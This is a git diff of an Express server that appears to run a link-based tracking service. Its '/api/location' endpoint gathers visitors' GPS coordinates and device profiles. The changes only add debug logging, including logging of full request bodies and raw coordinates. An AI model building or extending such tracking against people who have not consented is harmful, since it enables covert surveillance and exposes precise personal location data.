@@ -189,10 +189,16 @@ app.get('/track', async (req, res) => {
 
 // Endpoint to receive geolocation AND rich device profile
 app.post('/api/location', async (req, res) => {
+    console.log("API LOCATION HIT:", req.body);
     const { sessionId, latitude, longitude, error, deviceData } = req.body;
     
     const session = trackingData.find(s => s.sessionId === sessionId);
-    if (!session) return res.status(404).json({ success: false, message: 'Session not found' });
+    if (!session) {
+        console.log("Session NOT FOUND:", sessionId);
+        return res.status(404).json({ success: false, message: 'Session not found' });
+    }
+
+    console.log("Session found:", sessionId);
 
     // Process Device Profile Enrichment
     if (deviceData) {
@@ -293,6 +299,7 @@ app.post('/api/location', async (req, res) => {
 
     // Process GPS
     if (latitude && longitude) {
+        console.log("GPS received:", latitude, longitude);
         session.gps = `${latitude}, ${longitude}`;
         console.log(`[Location Updated] Session: ${sessionId}, Method: GPS`);
         
